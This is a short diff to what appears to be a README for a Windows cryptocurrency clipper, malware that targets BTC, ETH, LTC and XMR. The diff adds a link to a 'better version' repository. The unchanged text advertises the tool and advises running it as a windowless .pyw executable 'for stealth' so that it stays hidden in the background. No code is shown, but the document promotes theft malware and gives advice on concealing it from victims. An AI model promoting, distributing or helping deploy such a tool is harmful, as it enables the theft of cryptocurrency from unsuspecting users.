@@ -1,3 +1,5 @@
+# better version - https://github.com/3022-2/raccoon_clipper
+
 # Windows crypto clipper - USE MAIN.PYW AS EXE FOR STEALTH AS IT DOESNT HAVE TERMINAL (RUNS IN BACKGROUND HIDDEN)
 **BTC, ETH, LTC, XMR clipper written in python using no external packages. ONLY WORKS ON WINDOWS**
 ---
